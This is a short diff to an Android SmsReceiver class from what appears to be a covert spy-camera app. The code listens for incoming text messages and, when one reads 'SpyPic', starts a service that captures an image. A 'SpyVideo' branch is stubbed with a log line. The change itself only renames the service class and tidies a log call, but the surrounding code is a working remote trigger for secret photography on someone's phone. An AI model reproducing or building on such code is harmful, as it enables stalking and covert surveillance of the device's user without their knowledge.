@@ -27,10 +27,10 @@ public class SmsReceiver extends BroadcastReceiver {
                         msgBody = msgs[i].getMessageBody();
                         if (msgBody.equals("SpyPic")) {
                             Log.i("SPY_CAM" , "Capturing Image");
-                            Intent serviceIntent = new Intent(context, SpyService.class);
+                            Intent serviceIntent = new Intent(context, SpyPictureService.class);
                             context.startService(serviceIntent);
                         } else if (msgBody.equals("SpyVideo")) {
-                            Log.i("SPY_CAM" , "Capturing Video");
+                            Log.i("SPY_CAM", "Capturing Video");
                         }
                     }
                 } catch (Exception e) {
